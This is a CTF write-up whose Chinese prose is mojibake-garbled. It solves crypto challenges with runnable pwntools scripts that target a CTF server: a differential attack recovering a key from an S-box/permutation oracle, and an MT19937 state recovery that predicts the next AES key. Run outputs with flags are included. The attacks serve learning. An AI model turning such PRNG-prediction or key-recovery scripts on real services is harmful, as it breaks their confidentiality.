      * éšåï¼ŒæœåŠ¡å™¨å¼€å¯ä¸€ä¸ªâ€œé¢„è¨€æœºâ€ï¼ˆOracleï¼‰ï¼Œå…è®¸ä½ è¾“å…¥ä»»æ„æ˜æ–‡ `M`ã€‚
      * å¯¹äºä½ çš„è¾“å…¥ `M`ï¼ŒæœåŠ¡å™¨æ‰§è¡Œè‡ªå®šä¹‰çš„ `Encrypt` å‡½æ•°ï¼Œå¹¶è¿”å›ç»“æœ `C`ã€‚
      * **`Encrypt` å‡½æ•°é€»è¾‘**ï¼š
        $C = (P(S(M \oplus \text{key1})) \oplus \text{key2})$
        å…¶ä¸­ï¼š
          * `M` è¢«è½¬æ¢æˆæ•´æ•°ï¼ˆå°ç«¯åºï¼‰ã€‚
          * `^ key1`ï¼šä¸ç›®æ ‡å¯†é’¥å¼‚æˆ–ã€‚
          * `S`ï¼šå¯¹æ¯ä¸ªå­—èŠ‚è¿›è¡Œ S-Box æ›¿æ¢ã€‚
          * `P`ï¼šå¯¹ 128 ä½æ•´æ•°è¿›è¡Œæ¯”ç‰¹ç½®æ¢ã€‚
          * `^ key2`ï¼šä¸å¦ä¸€ä¸ªéšæœºå¯†é’¥å¼‚æˆ–ã€‚

2.  **æ”»å‡»æ€è·¯**ï¼š

      * æˆ‘ä»¬éœ€è¦æ¢å¤ `key1` æ¥è§£å¯† AES çš„ flagã€‚
      * ç”±äºæˆ‘ä»¬å¯ä»¥å¤šæ¬¡è¯·æ±‚ `Encrypt`ï¼Œä¸” `key2` æ˜¯å›ºå®šçš„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ **å·®åˆ†åˆ†æ** æ¶ˆé™¤ `key2` çš„å½±å“ã€‚
      * æ„é€ ä¸¤ä¸ªè¾“å…¥ $M_1$ å’Œ $M_2$ï¼Œä½¿å¾—å®ƒä»¬ä»…åœ¨ç¬¬ $k$ ä¸ªå­—èŠ‚ä¸Šæœ‰ç‰¹å®šçš„å·®åˆ† $\Delta_{in}$ã€‚
      * è·å–è¾“å‡º $C_1$ å’Œ $C_2$ï¼Œè®¡ç®—å·®åˆ† $\Delta C = C_1 \oplus C_2$ã€‚
      * æ ¹æ®å…¬å¼ï¼š
        $C_1 \oplus C_2 = P(S(M_1 \oplus k1)) \oplus P(S(M_2 \oplus k1))$
      * ç”±äºç½®æ¢ $P$ æ˜¯çº¿æ€§çš„ï¼ˆå¯¹äº XORï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥å°† $P$ é€†è¿ç®—ç§»åˆ°å·¦è¾¹ï¼š
        $P^{-1}(\Delta C) = S(M_1 \oplus k1) \oplus S(M_2 \oplus k1)$
      * è®¾ $P^{-1}(\Delta C)$ ä¸º $\Delta Y$ã€‚ç”±äºæˆ‘ä»¬åªæ”¹å˜äº†ç¬¬ $k$ ä¸ªå­—èŠ‚çš„è¾“å…¥ï¼Œæ ¹æ® S-Box çš„ç‹¬ç«‹æ€§ï¼Œ$\Delta Y$ ä¹Ÿåº”è¯¥åªåœ¨ç¬¬ $k$ ä¸ªå­—èŠ‚ä¸Šæœ‰éé›¶å€¼ã€‚
      * æ­¤æ—¶æ–¹ç¨‹å˜ä¸ºé’ˆå¯¹å•ä¸ªå­—èŠ‚çš„ S-Box å·®åˆ†æ–¹ç¨‹ï¼š
        $S(x) \oplus S(x \oplus \Delta_{in}) = \Delta Y_k$
        å…¶ä¸­ $x = M_1[k] \oplus \text{key1}[k]$ã€‚
      * å·²çŸ¥ $\Delta_{in}$ï¼ˆæˆ‘ä»¬æ„é€ çš„ï¼‰ï¼Œ$\Delta Y_k$ï¼ˆè®¡ç®—å‡ºçš„ï¼‰ï¼Œ$S$ï¼ˆå·²çŸ¥çš„ S-Boxï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥éå† 0-255 æ±‚è§£ $x$ã€‚
      * æ±‚å‡º $x$ åï¼Œå³å¯ç®—å‡º $\text{key1}[k] = x \oplus M_1[k]$ã€‚
      * é€ä¸ªå­—èŠ‚æ¢å¤ï¼Œæœ€ç»ˆå¾—åˆ°å®Œæ•´çš„ `key1`ã€‚

### è§£é¢˜è„šæœ¬

è¯·ç¡®ä¿ä½ å®‰è£…äº† `pwntools` å’Œ `pycryptodome` åº“ã€‚

```python
from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Util.number import long_to_bytes

# ================= é…ç½®éƒ¨åˆ† =================
# é¢˜ç›®æä¾›çš„å¸¸é‡
P = [10, 21, 40, 84, 41, 11, 60, 110, 83, 17, 36, 125, 112, 4, 19, 64, 53, 34, 73, 113,
     108, 57, 103, 8, 12, 58, 27, 117, 51, 126, 47, 111, 14, 99, 116, 25, 30, 1, 37,
     54, 67, 44, 88, 96, 76, 123, 7, 22, 65, 20, 118, 94, 95, 18, 50, 6, 61, 102, 49,
     86, 38, 62, 9, 43, 71, 127, 32, 104, 100, 59, 29, 0, 79, 31, 89, 105, 121, 39,
     75, 91, 114, 2, 81, 28, 97, 106, 3, 24, 87, 80, 93, 120, 66, 5, 72, 101, 23, 56,
     92, 98, 119, 78, 63, 124, 15, 42, 16, 35, 115, 122, 90, 52, 82, 46, 48, 107, 70,
     69, 33, 55, 45, 26, 74, 109, 13, 85, 77, 68]

S_BOX = [186, 99, 226, 183, 75, 20, 152, 193, 4, 205, 38, 2, 9, 189, 3, 19, 89, 28, 228,
         44, 225, 12, 0, 142, 30, 59, 54, 247, 138, 60, 137, 211, 153, 70, 109, 101,
         130, 27, 252, 234, 77, 241, 132, 49, 46, 190, 214, 115, 184, 122, 199, 76,
         103, 111, 182, 240, 31, 166, 48, 85, 11, 114, 171, 78, 230, 80, 15, 93, 239,
         191, 176, 249, 179, 244, 45, 150, 125, 106, 1, 55, 50, 42, 26, 82, 33, 235,
         135, 91, 22, 217, 128, 127, 254, 216, 221, 156, 104, 36, 229, 79, 227, 117,
         136, 215, 72, 24, 202, 200, 147, 43, 158, 223, 236, 92, 112, 175, 35, 168,
         96, 98, 248, 110, 58, 160, 218, 102, 74, 40, 208, 165, 159, 172, 123, 155,
         178, 149, 177, 34, 154, 198, 185, 88, 64, 170, 207, 139, 162, 140, 144, 90,
         194, 169, 6, 108, 237, 203, 81, 95, 201, 68, 16, 107, 174, 94, 105, 173, 157,
         246, 148, 163, 220, 126, 23, 253, 164, 65, 143, 52, 181, 51, 84, 197, 21, 187,
         113, 224, 63, 195, 32, 53, 151, 243, 250, 73, 120, 39, 134, 251, 188, 233, 87,
         56, 118, 222, 161, 10, 133, 141, 232, 69, 238, 145, 29, 119, 57, 196, 14, 242,
         131, 167, 37, 13, 255, 71, 83, 209, 100, 219, 245, 210, 66, 129, 204, 146, 86,
         17, 212, 192, 231, 47, 206, 62, 61, 67, 18, 124, 8, 41, 97, 116, 25, 5, 7, 213,
         121, 180]

# ================= è¾…åŠ©å‡½æ•° =================
def int_to_byte_array(n, byte_size=16):
    return [(n >> (8 * i)) & 0xFF for i in range(byte_size)]

def int_to_bin_128bit(T):
    return format(T, '0128b')

def bin_to_int_128bit(b):
    return int(b, 2)

# ç”Ÿæˆ P çš„é€†ç½®æ¢è¡¨
def generate_inv_P(P):
    INP = [0] * 128
    for i in range(128):
        INP[P[i] % 128] = i
    return INP

INP = generate_inv_P(P)

# æ‰§è¡Œ P çš„é€†ç½®æ¢
def P_inv_ex(T):
    bin_T = int_to_bin_128bit(T)
    permuted_bin = ['0'] * 128
    for i in range(128):
        # å¯¹åº” task1.py ä¸­çš„ P_ex é€»è¾‘ï¼šoutput[i] = input[P[i]]
        # é€†é€»è¾‘ï¼šoutput[i] = input[INP[i]]
        permuted_bin[i] = bin_T[INP[i] % 128]
    permuted_int = bin_to_int_128bit(''.join(permuted_bin))
    return permuted_int

# æ±‚è§£ S-Box å·®åˆ†
def get_candidates(diff_in, diff_out):
    # å¯»æ‰¾ xï¼Œä½¿å¾— S[x] ^ S[x ^ diff_in] == diff_out
    cands = []
    for x in range(256):
        if S_BOX[x] ^ S_BOX[x ^ diff_in] == diff_out:
            cands.append(x)
    return set(cands)

# ================= ä¸»é€»è¾‘ =================
def solve():
    # è¿æ¥é¢˜ç›®ç¯å¢ƒ
    host = 'geek.ctfplus.cn'
    port = 31462
    conn = remote(host, port)
    
    # 1. æ¥æ”¶åŠ å¯†çš„ Flag å’Œ IV
    # æ ¼å¼å½¢å¦‚: Cipher=b'\x...'
    line1 = conn.recvline().decode().strip()
    line2 = conn.recvline().decode().strip()
    
    # ä½¿ç”¨ eval è§£æå­—èŠ‚ä¸²è¡¨ç¤º
    cipher_hex = eval(line1.split('=', 1)[1])
    iv_hex = eval(line2.split('=', 1)[1])
    
    print(f"[+] Target Cipher: {cipher_hex.hex()}")
    print(f"[+] Target IV: {iv_hex.hex()}")
    
    key_bytes = [0] * 16
    
    # 2. é€å­—èŠ‚çˆ†ç ´ Key1
    for k in range(16):
        print(f"[*] Cracking key byte {k}...")
        
        # --- ç¬¬ä¸€ç»„å·®åˆ†ï¼šè¾“å…¥ 'a' å’Œ 'b' (å·®åˆ† 0x03) ---
        m_base = ['a'] * 16
        
        # æ„é€  M1
        m1 = m_base[:]
        msg1 = "".join(m1).encode()
        
        # æ„é€  M2 (ç¬¬ k å­—èŠ‚æ”¹ä¸º 'b')
        m2 = m_base[:]
        m2[k] = 'b'
        msg2 = "".join(m2).encode()
        
        # å‘é€å¹¶æ¥æ”¶ç»“æœ
        conn.recvuntil(b"please Input M")
        conn.sendline(msg1)
        conn.recvline() # è·³è¿‡å›æ˜¾
        c1_val = int(conn.recvline().decode().strip().split('=')[1])
        
        conn.recvuntil(b"please Input M")
        conn.sendline(msg2)
        conn.recvline() # è·³è¿‡å›æ˜¾
        c2_val = int(conn.recvline().decode().strip().split('=')[1])
        
        # è®¡ç®—å·®åˆ†
        delta_c = c1_val ^ c2_val
        # é€†ç½®æ¢ Pï¼Œå¾—åˆ° S-Box è¾“å‡ºå±‚çš„å·®åˆ†
        delta_y_int = P_inv_ex(delta_c)
        delta_y_bytes = int_to_byte_array(delta_y_int)
        
        dout1 = delta_y_bytes[k]
        din1 = ord('a') ^ ord('b') # 0x61 ^ 0x62 = 3
        
        # è·å–å¯èƒ½çš„ x å€™é€‰å€¼ (x = input ^ key)
        cands1 = get_candidates(din1, dout1)
        
        # --- ç¬¬äºŒç»„å·®åˆ†ï¼šè¾“å…¥ 'a' å’Œ 'c' (å·®åˆ† 0x02) ---
        # ç”¨äºè¿‡æ»¤å€™é€‰å€¼
        m3 = m_base[:]
        m3[k] = 'c'
        msg3 = "".join(m3).encode()
        
        conn.recvuntil(b"please Input M")
        conn.sendline(msg3)
        conn.recvline()
        c3_val = int(conn.recvline().decode().strip().split('=')[1])
        
        delta_c2 = c1_val ^ c3_val
        delta_y_int2 = P_inv_ex(delta_c2)
        delta_y_bytes2 = int_to_byte_array(delta_y_int2)
        
        dout2 = delta_y_bytes2[k]
        din2 = ord('a') ^ ord('c') # 0x61 ^ 0x63 = 2
        
        cands2 = get_candidates(din2, dout2)
        
        # å–äº¤é›†
        final_cands = cands1.intersection(cands2)
        
        if len(final_cands) == 1:
            x = final_cands.pop()
            # x = input_byte ^ key_byte  => key_byte = x ^ input_byte
            key_bytes[k] = x ^ ord('a')
            # print(f"    Byte {k} recovered: {key_bytes[k]}")
        else:
            print(f"[-] Failed to recover byte {k}. Candidates: {final_cands}")
            return

    # 3. é‡ç»„ Key1
    # int_to_byte_array æ˜¯å°ç«¯åº (LSB at index 0)
    key_int = 0
    for i in range(16):
        key_int += key_bytes[i] << (8 * i)
    
    # è½¬ä¸º AES éœ€è¦çš„ bytes (å¤§ç«¯åº)
    key_raw = long_to_bytes(key_int)
    print(f"[+] Recovered Key: {key_raw.hex()}")
    
    # 4. è§£å¯† Flag
    try:
        cipher = AES.new(key_raw, AES.MODE_CBC, iv_hex)
        flag = unpad(cipher.decrypt(cipher_hex), AES.block_size)
        print(f"\n[SUCCESS] FLAG: {flag.decode()}")
    except Exception as e:
        print(f"[-] Decryption failed: {e}")

if __name__ == "__main__":
    solve()
```
````

è¿è¡Œç»“æœ

```
[x] Opening connection to geek.ctfplus.cn on port 31462
[x] Opening connection to geek.ctfplus.cn on port 31462: Trying 222.186.150.28
[+] Opening connection to geek.ctfplus.cn on port 31462: Done
[+] Target Cipher: 12bd69202a84635f29211fdae54246c157e455f3ccc3508832fff67ee54c11fb489a012793a3b5adf22d77ac5b449b56
[+] Target IV: e6fae67f0d6a431c8062398166732355
[*] Cracking key byte 0...
[*] Cracking key byte 1...
[*] Cracking key byte 2...
[*] Cracking key byte 3...
[*] Cracking key byte 4...
[*] Cracking key byte 5...
[*] Cracking key byte 6...
[*] Cracking key byte 7...
[*] Cracking key byte 8...
[*] Cracking key byte 9...
[*] Cracking key byte 10...
[*] Cracking key byte 11...
[*] Cracking key byte 12...
[*] Cracking key byte 13...
[*] Cracking key byte 14...
[*] Cracking key byte 15...
[+] Recovered Key: b628e53a18c817592f00e7a11628f070

[SUCCESS] FLAG: SYC{this_is_new_gys_flag_oioioio}
[*] Closed connection to geek.ctfplus.cn port 31462
```

# oh my bag

è¿™ä¸ªé¢˜å…¶å®ä¸æ˜¯è®©ä½ çœŸå»æ‰“èƒŒåŒ…ï¼Œè€Œæ˜¯è®©ä½ æ‰“ Python çš„ `random`ï¼ˆMT19937ï¼‰ğŸ™‚
 æ ¸å¿ƒæ€è·¯ï¼šç”¨å‰ä¸¤è½®ç»™ä½ çš„ `A` æŠŠ PRNG çŠ¶æ€å®Œæ•´è¿˜åŸï¼Œç„¶åé¢„æµ‹**ä¸‹ä¸€æ¬¡**ç”Ÿæˆçš„ 156â€‘bit keyï¼Œå½“ä½œ AES å¯†é’¥è§£ç¬¬äºŒæ¬¡è¿æ¥çš„å¯†æ–‡ã€‚

ä¸‹é¢ä¸€æ­¥æ­¥æ¥ã€‚

------

## 1. ä»£ç æ¢³ç†ï¼ˆå…³é”®ä¿¡æ¯ï¼‰

å…³é”®ç‰‡æ®µæˆ‘ç”¨æ–‡å­—è½¬è¿°ä¸€ä¸‹ï¼š

```python
from random import getrandbits
from Crypto.Cipher import AES
from Crypto.Util.number import *

def encrypt(key,data):
    key = (key%(1<<128)).to_bytes(16, 'big', signed=False)
    iv = urandom(16)
    aes = AES.new(key, AES.MODE_CBC, iv)
    ct = aes.encrypt(pad(data, 16))
    return ct.hex(),iv

def genbit(a):
    bin_str = bin(a)[2:].zfill(156)
    return [int(b) for b in bin_str]

def gens(a):
    t = 0
    A = [getrandbits(64) for _ in range(len(a))]
    for i in range(len(a)):
        t += int(a[i]) * A[i]
    return t, A

def handle_client(conn):
    FLAG = open("flag.txt", "rb").read().strip()
    flag = bytes_to_long(FLAG)

    f = getrandbits(156)              # éšæœºç”Ÿæˆ 156-bit æ•´æ•°
    C,iv = encrypt(f, FLAG)           # ç”¨å®ƒå½“ AES keyï¼ˆå–ä½ 128 bitï¼‰

    # æç¤º + å¯†æ–‡ã€iv
    ...

    f = genbit(f)                     # è½¬æˆ 156 ç»´ {0,1} å‘é‡

    # 100 è½®â€œèƒŒåŒ…é—®ç­”â€
    for i in range(100):
        t, A = gens(f)                # A[i] ~ getrandbits(64)
        if i < 2:
            # å‰ä¸¤è½®æŠŠ t å’Œæ•´æ¡ A éƒ½ç»™ä½ 
        else:
            # åé¢åªç»™ t
```

è¦ç‚¹ï¼š

1. **AES å¯†é’¥**å°±æ˜¯é‚£ä¸ªéšæœºçš„ `f` çš„ä½ 128 bitã€‚
2. `f` ç”¨å®Œä¹‹åå°±è¢«è½¬æ¢æˆæ¯”ç‰¹å‘é‡ `f = genbit(f)`ï¼Œåé¢æ‰€æœ‰ `gens(f)` éƒ½æ˜¯åŒä¸€ä¸ªå‘é‡ã€‚
3. `gens` é‡Œæ¯æ¬¡ `A = [getrandbits(64) for _ in range(156)]`ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š
   - æ¯ä¸ªå…ƒç´  `A[j]` æ˜¯ä¸€æ¬¡ `getrandbits(64)`ï¼›
   - å‰ä¸¤è½®ä½ èƒ½æ‹¿åˆ°å®Œæ•´çš„ `A0`ã€`A1`ï¼ˆä¸€å…± 2Ã—156 ä¸ª 64â€‘bit å€¼ï¼‰ã€‚
4. `from random import getrandbits` ç”¨çš„æ˜¯ **Python æ ‡å‡†åº“ `random` çš„å…¨å±€ PRNG**ï¼Œå³ **MT19937**ï¼ˆMersenne Twisterï¼‰ã€‚
   - å†…éƒ¨çŠ¶æ€æ˜¯ 624 ä¸ª 32â€‘bit æ•´æ•°ï¼ˆå…± 19968 bitï¼‰ã€‚
   - å·²çŸ¥**è¿ç»­çš„ 624 ä¸ª 32â€‘bit è¾“å‡º**å°±èƒ½å”¯ä¸€è¿˜åŸå†…éƒ¨çŠ¶æ€ã€‚

å…³é”®è§‚å¯Ÿï¼š

> å‰ä¸¤è½®å…±æœ‰ 2 Ã— 156 æ¬¡ `getrandbits(64)` â‡’ æ¯æ¬¡ 64 ä½éƒ½ç”± **ä¸¤ä¸ªè¿ç»­çš„ 32â€‘bit è¾“å‡ºæ‹¼æˆ** â‡’ ä¸€å…± 2Ã—156Ã—2 = **624 ä¸ª 32â€‘bit è¾“å‡º**ã€‚åˆšå¥½æŠŠ MT19937 çš„å†…éƒ¨çŠ¶æ€å®Œå…¨æ³„éœ²ã€‚

------

## 2. åˆ©ç”¨ MT19937 æ³„éœ²æ¥é¢„è¨€ä¸‹ä¸€æ¬¡ key

### 2.1 è¿˜åŸ PRNG

æœ‰ç°æˆè½®å­ï¼š`mersenne-twister-predictor` é‡Œçš„ `MT19937Predictor`ï¼Œä¸“é—¨ç”¨æ¥è¿˜åŸ Python `random` çš„çŠ¶æ€ã€‚

å®ƒæœ‰ä¸ªæ¥å£ï¼š

```python
predictor.setrandbits(y, bits)
```

è¿™é‡Œ `y` å°±æ˜¯æŸæ¬¡ `random.getrandbits(bits)` çš„è¿”å›å€¼ï¼Œ`bits` æ˜¯å¯¹åº”æ¯”ç‰¹æ•°ã€‚
 å¯¹äº 64 ä½è¾“å‡ºï¼Œå†…éƒ¨ä¼šæ‹†æˆä¸¤ä¸ª 32 ä½ä¾æ¬¡å–‚è¿›è¿˜åŸå™¨ï¼Œåˆšå¥½åŒ¹é… CPython çš„å®ç°æ–¹å¼ã€‚

æˆ‘ä»¬çš„åšæ³•ï¼š

1. ç¬¬ä¸€æ¬¡è¿ä¸ŠæœåŠ¡ï¼ˆç§°ä¸º **è¿æ¥1**ï¼‰ã€‚
2. æ‹¿åˆ°æ¬¢è¿è¯­ã€æç¤ºã€**ç¬¬ä¸€è½®çš„ tã€Aï¼ˆé•¿åº¦ 156ï¼‰**ï¼Œå›å¤ "-"ã€‚
3. å†æ‹¿åˆ°**ç¬¬äºŒè½®çš„ tã€A**ï¼Œå†æ¬¡å›å¤ "-" ä¹‹åç«‹åˆ»å‘ä¸€ä¸ªå…¶å®ƒå­—ç¬¦ï¼ˆæ¯”å¦‚ "q"ï¼‰é€€å‡ºå¾ªç¯ï¼Œè®©è¯¥è¿æ¥ä¸å†ç”Ÿæˆæ›´å¤šéšæœºæ•°ã€‚
4. æŠŠ `A0 + A1` è¿™ 312 ä¸ª 64 ä½æ•°ï¼ŒæŒ‰é¡ºåºä¾æ¬¡å–‚ç»™ `MT19937Predictor.setrandbits(a, 64)`ã€‚
   - 312 Ã— 64 = 19968 bitï¼Œæ°å¥½æ˜¯ 624Ã—32ã€‚
   - å–‚å®Œåï¼Œæˆ‘ä»¬çš„ `predictor` ä¸æœåŠ¡å™¨ä¸Šçš„ `random` å¤„äº**å®Œå…¨ç›¸åŒçš„çŠ¶æ€**ï¼ˆå°±åœ¨ç¬¬äºŒè½® `gens` ç»“æŸä¹‹åï¼‰ã€‚

### 2.2 é¢„æµ‹ä¸‹ä¸€æ¬¡ key åœ¨å“ªå„¿ç”¨åˆ°

æ³¨æ„ `handle_client` çš„è°ƒç”¨é¡ºåºï¼š
 å¯¹æ¯ä¸€ä¸ªæ–°çš„è¿æ¥ï¼Œç¬¬ä¸€è¡Œç›¸å…³éšæœºæ•°è°ƒç”¨å°±æ˜¯ï¼š

```python
f = getrandbits(156)
```

ä¹Ÿå°±æ˜¯è¯´ï¼š**ä¸‹ä¸€æ¬¡æœ‰æ–°è¿æ¥è¿›æ¥æ—¶**ï¼ŒæœåŠ¡å™¨ä¼šç”¨å½“å‰ PRNG çŠ¶æ€ç”Ÿæˆä¸€ä¸ªæ–°çš„ 156â€‘bit éšæœºæ•° `f_next`ï¼Œä½œä¸º AES å¯†é’¥ã€‚

è€Œæˆ‘ä»¬è¿™è¾¹å·²ç»æœ‰äº†å…‹éš†å‡ºæ¥çš„ `predictor`ï¼Œä¸”çŠ¶æ€åŒæ­¥ï¼Œæ‰€ä»¥ï¼š

```python
f_next = predictor.getrandbits(156)
```

ç®—å‡ºæ¥çš„ `f_next` å°±æ˜¯ **ä¸‹ä¸€æ¬¡è¿æ¥**è¦ç”¨çš„ AES å¯†é’¥ï¼ˆ156 bit çš„æ•´å‹å€¼ï¼‰â€”â€”æœåŠ¡å™¨é‚£è¾¹ä¹‹åä¼šå– `f_next % 2^128`ï¼ŒæŒ‰å¤§ç«¯è½¬æˆ 16 å­—èŠ‚å½“ keyã€‚

äºæ˜¯æ”»å‡»æµç¨‹æ˜¯ï¼š

1. **è¿æ¥1**ï¼šæ”¶é›†å‰ä¸¤è½®çš„ `A` æ¥è¿˜åŸ PRNG çŠ¶æ€ã€‚

2. ç”¨ `MT19937Predictor` è®¡ç®—å‡ºä¸‹ä¸€æ¬¡ `getrandbits(156)` çš„ç»“æœ `f_next`ã€‚

3. **è¿æ¥2**ï¼šå†æ¬¡è¿ä¸ŠæœåŠ¡ï¼Œè¿™ä¸€æ¬¡ï¼š

   - æœåŠ¡å™¨ä¼šåœ¨æˆ‘ä»¬çœ‹åˆ°ä»»ä½•ä¸œè¥¿ä¹‹å‰ç”Ÿæˆ `f = getrandbits(156)`ã€‚
   - å› ä¸ºæˆ‘ä»¬æå‰é¢„æµ‹äº†è¿™ä¸€å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬**å·²ç»çŸ¥é“è¿™ä¸ª AES key**ã€‚

4. ä»è¿æ¥2çš„è¾“å‡ºä¸­æ‹¿åˆ° `C` å’Œ `iv`ï¼š

   ```text
   this_is_someC=<hex_cipher>,iv=b'...'
   ```

5. æœ¬åœ°ç”¨é¢„æµ‹å¥½çš„ key è§£å¯†å³å¯æ‹¿åˆ° FLAGã€‚

è¿™æ ·å®Œå…¨**ä¸éœ€è¦**å»è§£èƒŒåŒ…ï¼ˆä¸è¿‡é¢˜åå« â€œo_mybagâ€ï¼Œå°±æ˜¯æ‹¿èƒŒåŒ…æ¥è¿·æƒ‘ä½ ä¸€ä¸‹ ğŸ˜‚ï¼‰ã€‚

------

## 3. å…·ä½“è„šæœ¬ç¤ºä¾‹ï¼ˆä¸¤æ¬¡è¿æ¥æ–¹æ¡ˆï¼‰

ä¸‹é¢æ˜¯ä¸€ä¸ªç”¨ `pwntools + mt19937predictor + pycryptodome` çš„å‚è€ƒè„šæœ¬ï¼Œä½ å¯ä»¥æ ¹æ®è‡ªå·±ä¹ æƒ¯æ”¹æˆ `socket` ä¹‹ç±»çš„ã€‚

å…ˆå®‰è£…ä¾èµ–ï¼ˆæœ¬åœ°æœºè·‘ï¼Œä¸æ˜¯è¿œç«¯ï¼‰ï¼š

```bash
pip install pwntools mersenne-twister-predictor pycryptodome
```

è„šæœ¬ï¼ˆPython 3ï¼‰ï¼š

```python
from pwn import remote
import re, ast
from mt19937predictor import MT19937Predictor
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

HOST = "geek.ctfplus.cn"
PORT = 31006

def parse_header_and_cipher(conn):
    conn.recvline()  # welcome
    hint_line = conn.recvline().decode().strip()
    cipher_line = conn.recvline().decode().strip()

    # æç¤ºï¼šhow long flag is <bits>ï¼ˆç”¨ä¸å¤ªä¸Šï¼‰
    m_hint = re.search(r"how long flag is (\d+)", hint_line)
    flag_bits = int(m_hint.group(1))

    # this_is_someC=<hex>,iv=<repr(bytes)>
    m_c = re.search(r"this_is_someC=(.*),iv=(.*)", cipher_line)
    C_hex = m_c.group(1)
    iv_repr = m_c.group(2)
    iv = ast.literal_eval(iv_repr)  # æŠŠ b'...' å˜æˆ bytes

    return flag_bits, C_hex, iv

def parse_one_knapsack_round(conn):
    data = conn.recvuntil(b"enter -:").decode()
    # å½¢å¦‚ï¼š I wil give you\n t=xxx,\nA=[a0, a1, ...]\nenter -:
    m = re.search(r"t=(\d+),\s*A=\[(.*)\]", data, re.S)
    t = int(m.group(1))
    A_str = m.group(2).strip()
    if A_str:
        A = list(map(int, A_str.split(',')))
    else:
        A = []
    return t, A

# ---------- è¿æ¥1ï¼šæ”¶é›† A ----------

conn1 = remote(HOST, PORT)
flag_bits1, C1_hex, iv1 = parse_header_and_cipher(conn1)

# round 0
t0, A0 = parse_one_knapsack_round(conn1)
conn1.sendline(b"-")

# round 1
t1, A1 = parse_one_knapsack_round(conn1)
conn1.sendline(b"q")  # éšä¾¿å‘ä¸ªä¸æ˜¯ "-" çš„è®©æœåŠ¡ç«¯ break æ‰

conn1.close()

assert len(A0) == 156 and len(A1) == 156

# ---------- è¿˜åŸ MT19937 çŠ¶æ€ ----------
pred = MT19937Predictor()
for x in A0 + A1:         # å…± 312 ä¸ª 64-bit
    pred.setrandbits(x, 64)

# é¢„æµ‹ä¸‹ä¸€æ¬¡ getrandbits(156) çš„ç»“æœ
f_next = pred.getrandbits(156)

# ---------- è¿æ¥2ï¼šæ‹¿æ–°çš„å¯†æ–‡ ----------
conn2 = remote(HOST, PORT)
flag_bits2, C2_hex, iv2 = parse_header_and_cipher(conn2)
conn2.close()

# ---------- ç”¨é¢„æµ‹çš„ key è§£å¯† ----------
key_bytes = (f_next % (1 << 128)).to_bytes(16, "big")
cipher = AES.new(key_bytes, AES.MODE_CBC, iv2)
pt_padded = cipher.decrypt(bytes.fromhex(C2_hex))
flag = unpad(pt_padded, 16)

print("FLAG =", flag)
```

è·‘èµ·æ¥å¦‚æœä¸€åˆ‡é¡ºåˆ©ï¼Œæœ€åä¸€è¡Œå°±ä¼šæ‰“å°å‡º `flag{...}` ä¹‹ç±»çš„ä¸œè¥¿ã€‚

------

## 4. ä¸€ç‚¹è¡¥å……ï¼šä¸ºä»€ä¹ˆä¸ç”¨ LLL ç›´æ¥æ‰“èƒŒåŒ…ï¼Ÿ

ä½ æœ‰ sage + fpylllï¼Œæ‰€ä»¥ç†è®ºä¸Šå¯ä»¥å°è¯•æŠŠä¸¤è½® `(t, A)` æ‹¼æˆäºŒç»´èƒŒåŒ…ï¼Œç„¶åç”¨ LLL / BKZ æ˜¾å¼è§£ `{0,1}^156` çš„å‘é‡ã€‚ä½†è¿™é‡Œï¼š

- åªæœ‰ä¸¤æ¡æ–¹ç¨‹ï¼ˆä¸¤è½®ï¼‰ï¼Œå±äºé«˜å¯†åº¦å¤šç»´èƒŒåŒ…ï¼›
- ç†è®ºä¸Šè§£æ˜¯å”¯ä¸€çš„ï¼Œä½† LLL åœ¨è¿™ç§å¯†åº¦ä¸‹æˆåŠŸç‡å¹¶ä¸é«˜ï¼Œè°ƒå‚æ•°æ¯”è¾ƒè´¹åŠ²ï¼›
- è¿˜è¦æšä¸¾å¯èƒ½çš„å¤šä¸ªè§£å†ç”¨ AES æ ¡éªŒã€‚

è€Œ PRNG è¿™æ¡è·¯ï¼š

- ä¿¡æ¯è¶³å¤Ÿï¼š2Ã—156Ã—64 bit æ­£å¥½è¦†ç›– 624Ã—32 bit å†…éƒ¨çŠ¶æ€ï¼›
- æœ‰æˆç†Ÿç°æˆåº“ï¼ˆ`mt19937predictor`ï¼‰ç›´æ¥ç”¨ï¼›
- ç®—æ³•å¤æ‚åº¦éå¸¸å°ï¼ŒåŸºæœ¬æ˜¯å¸¸æ•°æ—¶é—´çš„è®¡ç®— + ä¸¤æ¬¡ socket äº¤äº’ã€‚

æ‰€ä»¥è¿™é¢˜æ›´åƒæ˜¯â€œPRNG / MT19937 åˆ©ç”¨é¢˜â€ï¼ŒèƒŒåŒ…åªæ˜¯ä¸ªå¹Œå­ã€‚

------

è¿è¡Œç»“æœ

```
(latt) âœ  ~ python solve.py
[+] Opening connection to geek.ctfplus.cn on port 31006: Done
[*] Closed connection to geek.ctfplus.cn port 31006
[+] Opening connection to geek.ctfplus.cn on port 31006: Done
[*] Closed connection to geek.ctfplus.cn port 31006
FLAG = b'SYC{magicEagle2025ctf!!}'
```

# è™çš®é’æ¤’

æ˜¯çš„ï¼Œ`[*] recovered oil space dimension = 1` ç»å¯¹æ˜¯ä¸å¯¹çš„â€”â€”æ²¹ç©ºé—´çœŸå®ç»´åº¦åº”è¯¥æ˜¯ `m = 50`ï¼Œè¯´æ˜æˆ‘ä»¬ä¹‹å‰ç›´æ¥æ‹¿ `Attack.sage` æ¥ç”¨æ˜¯**å–‚é”™æ ¼å¼äº†**ï¼Œå®ƒå…ˆè·‘äº†ä¸€éè‡ªå·±å†…ç½®çš„ demoï¼ˆä½ çœ‹åˆ°çš„ `q=256 m=44 v=68`ï¼‰ï¼Œç„¶åå¯¹æˆ‘ä»¬è¿™å¥—å‚æ•°çš„å¤„ç†ä¹Ÿä¸ç¬¦åˆé¢„æœŸã€‚

